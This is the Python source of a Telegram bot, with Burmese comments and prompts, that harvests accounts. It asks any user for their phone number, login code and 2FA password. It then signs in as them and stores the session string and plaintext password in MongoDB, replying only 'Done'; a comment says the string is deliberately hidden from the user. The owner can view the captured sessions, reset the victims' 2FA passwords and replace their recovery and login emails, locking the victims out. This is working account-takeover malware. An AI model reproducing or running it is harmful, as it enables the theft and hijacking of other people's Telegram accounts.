import os, asyncio, datetime
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import SendVerifyEmailCodeRequest, VerifyEmailRequest
from telethon.tl.types import EmailVerifyPurposeLoginSetup, EmailVerificationCode
from aiohttp import web
from pymongo import MongoClient
from bson import ObjectId

API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"]
BOT_TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
MONGO_URI = os.environ["MONGO_URI"]

mongo = MongoClient(MONGO_URI)
col = mongo["tgsessions"]["sessions"]

bot = TelegramClient(StringSession(), API_ID, API_HASH)
state = {}


async def finish(e, s):
    string = s["client"].session.save()
    me = await s["client"].get_me()
    await s["client"].disconnect()
    phone = s["phone"]
    has_2fa = bool(s.get("had_2fa"))
    twofa_password = s.get("twofa_password")
    state.pop(e.sender_id, None)

    col.insert_one({
        "phone": phone,
        "user_id": me.id,
        "username": me.username,
        "first_name": me.first_name,
        "session_string": string,
        "has_2fa": has_2fa,
        "twofa_password": twofa_password,
        "twofa_hint": None,
        "recovery_email": None,
        "login_email": None,
        "added_by": e.sender_id,
        "created_at": datetime.datetime.utcnow(),
    })

    # User ဆီကို session string မပြဘဲ "Done" ပဲ ပြန်ပြောသည်
    await e.respond(f"Done {phone}")


def account_buttons(doc_id):
    return [
        [Button.inline("2FA password ပြောင်းရန်", data=f"chpw:{doc_id}")],
        [Button.inline("Recovery email ပြောင်းရန်", data=f"chmail:{doc_id}")],
        [Button.inline("Login email ပြောင်းရန်", data=f"chlogin:{doc_id}")],
        [Button.inline("← List ပြန်ကြည့်ရန်", data="relist")],
    ]


@bot.on(events.NewMessage)
async def handler(e):
    text = e.raw_text.strip()

    if text == "/start":
        state[e.sender_id] = {"step": "phone"}
        await e.respond("ဖုန်းနံပါတ် ပို့ပါ (+959...)")
        return

    if text == "/list":
        if e.sender_id != OWNER_ID:
            return
        await show_list(e)
        return

    s = state.get(e.sender_id)
    if not s:
        return

    try:
        # --- account အသစ် ထည့်နေသည့် flow ---
        if s.get("step") == "phone":
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            sent = await c.send_code_request(text)
            s.update(client=c, phone=text, hash=sent.phone_code_hash, step="code")
            await e.respond("Login code ပို့ပါ။ ဂဏန်းတွေကြားမှာ space ခြားပါ (ဥပမာ 1 2 3 4 5)")

        elif s.get("step") == "code":
            code = text.replace(" ", "").replace("-", "")
            try:
                await s["client"].sign_in(s["phone"], code, phone_code_hash=s["hash"])
                s["had_2fa"] = False
            except SessionPasswordNeededError:
                s["step"] = "password"
                await e.respond("2FA password ပို့ပါ")
                return
            await finish(e, s)

        elif s.get("step") == "password":
            await s["client"].sign_in(password=text)
            s["had_2fa"] = True
            s["twofa_password"] = text
            await finish(e, s)

        # --- admin က 2FA password ပြောင်းနေသည့် flow ---
        elif s.get("step") == "new_pw":
            s["new_pw"] = text
            s["step"] = "new_hint"
            await e.respond("Hint စာသား ပို့ပါ (မလိုရင် /skip လို့ ပို့ပါ)")

        elif s.get("step") == "new_hint":
            hint = "" if text == "/skip" else text
            await apply_new_password(e, s, hint)

        # --- admin က recovery email ပြောင်းနေသည့် flow ---
        elif s.get("step") == "new_email":
            if text == "/skip":
                await e.respond("Email ပြောင်းခြင်း ကျော်လိုက်ပါပြီ။")
                state.pop(e.sender_id, None)
                return
            await apply_new_email(e, s, text)

        elif s.get("step") == "email_code":
            await apply_email_code(e, s, text)

        # --- admin က login email ပြောင်းနေသည့် flow ---
        elif s.get("step") == "new_login_email":
            if text == "/skip":
                await e.respond("Login email ပြောင်းခြင်း ကျော်လိုက်ပါပြီ။")
                state.pop(e.sender_id, None)
                return
            await apply_new_login_email(e, s, text)

        elif s.get("step") == "login_email_code":
            await apply_login_email_code(e, s, text)

    except Exception as ex:
        state.pop(e.sender_id, None)
        await e.respond(f"Error: {ex}\n/start နဲ့ ပြန်စပါ")


async def show_list(e):
    rows = list(col.find({}).sort("created_at", -1).limit(30))
    if not rows:
        await e.respond("Database ထဲ session မရှိသေးပါ။")
        return
    buttons = [
        [Button.inline(f"{r.get('phone')} - {r.get('first_name','')}", data=f"show:{r['_id']}")]
        for r in rows
    ]
    await e.respond("Account list (ကြည့်ချင်ရင် နှိပ်ပါ):", buttons=buttons)


@bot.on(events.CallbackQuery(pattern=b"relist"))
async def on_relist(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    await event.answer()
    await show_list(event)


@bot.on(events.CallbackQuery(pattern=b"show:"))
async def on_show(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    doc_id = event.data.decode().split(":", 1)[1]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer()

    twofa_line = "2FA: ✅ ပါသည်" if row.get("has_2fa") else "2FA: ❌ မပါပါ"
    hint = row.get("twofa_hint")
    hint_line = f"\nHint: {hint}" if hint else ""
    email = row.get("recovery_email")
    email_line = f"\nRecovery email: {email}" if email else "\nRecovery email: မထည့်ရသေးပါ"
    login_email = row.get("login_email")
    login_email_line = f"\nLogin email: {login_email}" if login_email else "\nLogin email: မထည့်ရသေးပါ"

    await event.respond(
        f"Phone: {row.get('phone')}\n"
        f"Name: {row.get('first_name','')} (@{row.get('username')})\n"
        f"{twofa_line}{hint_line}{email_line}{login_email_line}\n\n"
        f"Session string (tap to copy):\n`{row['session_string']}`",
        parse_mode="markdown",
        buttons=account_buttons(doc_id),
    )


# --- 2FA password ပြောင်းခြင်း ---

@bot.on(events.CallbackQuery(pattern=b"chpw:"))
async def on_chpw(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    doc_id = event.data.decode().split(":", 1)[1]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer()
    state[event.sender_id] = {"step": "new_pw", "doc_id": doc_id}
    await event.respond(f"{row.get('phone')} အတွက် 2FA password အသစ်ကို ပို့ပါ")


async def apply_new_password(e, s, hint):
    doc_id = s["doc_id"]
    new_pw = s["new_pw"]
    state.pop(e.sender_id, None)

    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await e.respond("Record မတွေ့ပါ။")
        return

    c = TelegramClient(StringSession(row["session_string"]), API_ID, API_HASH)
    await c.connect()
    try:
        current_pw = row.get("twofa_password") if row.get("has_2fa") else None
        await c.edit_2fa(current_password=current_pw, new_password=new_pw, hint=hint)
    except Exception as ex:
        await e.respond(f"2FA ပြောင်းရာမှာ error: {ex}")
        await c.disconnect()
        return
    await c.disconnect()

    col.update_one(
        {"_id": ObjectId(doc_id)},
        {"$set": {"has_2fa": True, "twofa_password": new_pw, "twofa_hint": hint or None}},
    )
    await e.respond(f"{row.get('phone')} ရဲ့ 2FA password ကို ပြောင်းပြီးပါပြီ။")


# --- Recovery email ပြောင်းခြင်း ---
# Telegram ၏ login/recovery email ဖြစ်ပြီး Gmail inbox ကို ဝင်ရောက်တာ မဟုတ်ပါ
# (ဒီ email လိပ်စာဆီ Telegram ကနေ ပို့တဲ့ code ကိုပဲ ထည့်ရန်လိုအပ်သည်)

@bot.on(events.CallbackQuery(pattern=b"chmail:"))
async def on_chmail(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    doc_id = event.data.decode().split(":", 1)[1]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return

    if not row.get("has_2fa"):
        # 2FA password မသတ်မှတ်ရသေးရင် Telegram က recovery email ထည့်ခွင့်မပြုပါ
        await event.answer()
        await event.respond(
            f"{row.get('phone')} မှာ 2FA password မရှိသေးလို့ "
            f"recovery email ထည့်ခွင့်မရပါ (Telegram ၏ feature limitation ပါ)။\n"
            f"အရင် \"2FA password ပြောင်းရန်\" ကို နှိပ်ပြီး password အရင်သတ်မှတ်ပါ။"
        )
        return

    await event.answer()
    state[event.sender_id] = {"step": "new_email", "doc_id": doc_id}
    await event.respond(
        f"{row.get('phone')} အတွက် recovery email အသစ်ကို ပို့ပါ "
        f"(ဒီလိုင်းက Telegram ဖြုတ်ပြီး အသစ်အစားထိုးပေးပါမယ်)\n"
        f"မလိုရင် /skip လို့ ပို့ပါ"
    )


async def apply_new_email(e, s, email_text):
    doc_id = s["doc_id"]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        state.pop(e.sender_id, None)
        await e.respond("Record မတွေ့ပါ။")
        return

    c = TelegramClient(StringSession(row["session_string"]), API_ID, API_HASH)
    await c.connect()
    current_pw = row.get("twofa_password")

    async def run_edit():
        try:
            await c.edit_2fa(
                current_password=current_pw,
                email=email_text,
                email_code_callback=lambda: _wait_for_code(e, s, c, email_text),
            )
            doc_id = s["doc_id"]
            col.update_one({"_id": ObjectId(doc_id)}, {"$set": {"recovery_email": email_text}})
            await e.respond(f"Recovery email ကို {email_text} အဖြစ် ပြောင်းပြီးပါပြီ။")
        except Exception as ex:
            await e.respond(f"Email ပြောင်းရာမှာ error: {ex}")
        finally:
            await c.disconnect()
            state.pop(e.sender_id, None)
            _pending_email_futures.pop(e.sender_id, None)

    # edit_2fa က verification code ကို await လုပ်နေမှာမို့ background task ထဲမှာ run ရသည်
    asyncio.create_task(run_edit())


_pending_email_futures = {}


def _wait_for_code(e, s, c, email_text):
    # Telethon က ဒီ callback ကနေ code ကို await လုပ်မည် (coroutine ပြန်ပေးရမည်)
    fut = asyncio.get_event_loop().create_future()
    _pending_email_futures[e.sender_id] = fut
    s["client_for_email"] = c
    s["step"] = "email_code"
    s["new_email_text"] = email_text
    asyncio.create_task(e.respond("Email ဆီကို Telegram ကပို့ထားတဲ့ verification code ကို ပို့ပါ"))

    async def waiter():
        return await fut
    return waiter()


async def apply_email_code(e, s, code_text):
    # Code ကို run_edit() background task ထဲက edit_2fa ဆီ ပြန်ပို့ပေးသည်
    # run_edit() ကိုယ်တိုင်က "Done" သို့မဟုတ် error message ကို ပို့ပါလိမ့်မည်
    fut = _pending_email_futures.pop(e.sender_id, None)
    if fut and not fut.done():
        fut.set_result(code_text.strip())
    else:
        await e.respond("Code စောင့်နေတာ မရှိပါ။ /start ကနေ ပြန်စမလား")
        state.pop(e.sender_id, None)


# --- Login email ပြောင်းခြင်း ---
# ("Login email" = SMS code အစား email ကို login-code လက်ခံရန် သုံးတဲ့ Telegram setting
#  2FA recovery email နဲ့ မတူပါ။ Account အားလုံးမှာ ဒီ feature မပါတတ်ပါ -
#  Telegram server version/rollout အပေါ်မူတည်ပြီး ANDMORE_EMAIL_LOGIN_NOT_ALLOWED
#  စတဲ့ error မျိုး ပြန်လာနိုင်သည်)

@bot.on(events.CallbackQuery(pattern=b"chlogin:"))
async def on_chlogin(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    doc_id = event.data.decode().split(":", 1)[1]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer()
    state[event.sender_id] = {"step": "new_login_email", "doc_id": doc_id}
    await event.respond(
        f"{row.get('phone')} အတွက် login email အသစ်ကို ပို့ပါ\n"
        f"(ဒီ account မှာ ဒီ feature မပါခဲ့ရင် error ပြပေးပါမယ်)\n"
        f"မလိုရင် /skip လို့ ပို့ပါ"
    )


_pending_login_email_futures = {}


async def apply_new_login_email(e, s, email_text):
    doc_id = s["doc_id"]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        state.pop(e.sender_id, None)
        await e.respond("Record မတွေ့ပါ။")
        return

    c = TelegramClient(StringSession(row["session_string"]), API_ID, API_HASH)
    await c.connect()

    try:
        me = await c.get_me()
        result = await c(SendVerifyEmailCodeRequest(
            purpose=EmailVerifyPurposeLoginSetup(
                phone_number=row.get("phone"),
                phone_code_hash="",  # login setup ဆိုတော့ logged-in client အတွက် phone_code_hash မလိုပါ
            ),
            email=email_text,
        ))
    except Exception as ex:
        await e.respond(
            f"Login email ထည့်ရာမှာ error: {ex}\n\n"
            f"ဒီ account မှာ \"Login email\" feature ဒီ Telegram server version "
            f"ပေါ်မှာ မပါသေးတာ ဖြစ်နိုင်ပါတယ် (account အားလုံးမှာ ပါချင်မှ ပါတတ်သည်)။"
        )
        await c.disconnect()
        state.pop(e.sender_id, None)
        return

    s["login_email_text"] = email_text
    s["step"] = "login_email_code"
    s["client_for_login_email"] = c
    await e.respond("Login email ဆီကို Telegram ကပို့ထားတဲ့ verification code ကို ပို့ပါ")


async def apply_login_email_code(e, s, code_text):
    doc_id = s["doc_id"]
    email_text = s.get("login_email_text")
    c = s.get("client_for_login_email")
    state.pop(e.sender_id, None)

    if not c:
        await e.respond("Session ပျောက်သွားပါပြီ။ /list ကနေ ပြန်စမလား")
        return

    try:
        await c(VerifyEmailRequest(
            purpose=EmailVerifyPurposeLoginSetup(
                phone_number=(col.find_one({"_id": ObjectId(doc_id)}) or {}).get("phone", ""),
                phone_code_hash="",
            ),
            verification=EmailVerificationCode(code=code_text.strip()),
        ))
    except Exception as ex:
        await e.respond(f"Code အတည်ပြုရာမှာ error: {ex}")
        await c.disconnect()
        return

    await c.disconnect()
    col.update_one({"_id": ObjectId(doc_id)}, {"$set": {"login_email": email_text}})
    await e.respond(f"Login email ကို {email_text} အဖြစ် ပြောင်းပြီးပါပြီ။")


async def index(request):
    return web.Response(text="ok")


async def keep_alive():
    import aiohttp
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        print("RENDER_EXTERNAL_URL env var မတွေ့ပါ - keep_alive ping ကျော်လိုက်သည်")
        return
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    print(f"keep_alive ping: {resp.status}")
            except Exception as ex:
                print(f"keep_alive ping error: {ex}")
            await asyncio.sleep(60)


async def main():
    await bot.start(bot_token=BOT_TOKEN)
    app = web.Application()
    app.add_routes([web.get("/", index)])
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
    asyncio.create_task(keep_alive())
    await bot.run_until_disconnected()


asyncio.run(main())
